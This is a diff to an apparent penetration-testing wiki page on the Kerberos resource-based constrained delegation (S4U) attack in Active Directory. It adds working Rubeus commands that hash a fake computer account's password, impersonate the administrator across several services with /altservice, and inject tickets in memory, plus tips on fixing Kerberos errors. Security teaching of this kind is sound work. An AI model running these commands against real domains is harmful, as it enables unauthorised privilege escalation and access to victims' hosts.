@@ -66,7 +66,7 @@ Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount 
 First of all, we created the new Computer object with the password `123456`, so we need the hash of that password:
 
 ```bash
-.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER /domain:domain.local
+.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
 
 This will print the RC4 and AES hashes for that account.  
@@ -78,6 +78,12 @@ rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:admin
 
 ![](../../.gitbook/assets/b3.png)
 
+You can generate more tickets just asking once using the `/altservice` param of Rubeus:
+
+```bash
+> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:cifs,time,host,http,winrm,rpcss,ldap /domain:domain.local /ptt
+```
+
 ### Accessing
 
 The last command line will perform the **complete S4U attack and will inject the TGS** from Administrator to the victim host in **memory**.  
@@ -88,6 +94,12 @@ ls \\victim.domain.local\C$
 ```
 
 ![](../../.gitbook/assets/b4.png)
+
+## Kerberos Errors
+
+* **`KDC_ERR_ETYPE_NOTSUPP`**: This means that kerberos is configured to not use DES or RC4 and you are supplying just the RC4 hash. Supply to Rubeus at least the AES256 hash \(or just supply it the rc4, aes128 and aes256 hashes\). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
+* **`KRB_AP_ERR_SKEW`**: This means that the time of the current computer is different from the one of the DC and kerberos is not working properly.
+* **`preauth_failed`**: This means that the given  username + hashes aren't working to login. You may have forgotten to put the "$" inside the username when generating the hashes \(`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`\)
 
 ## References
 
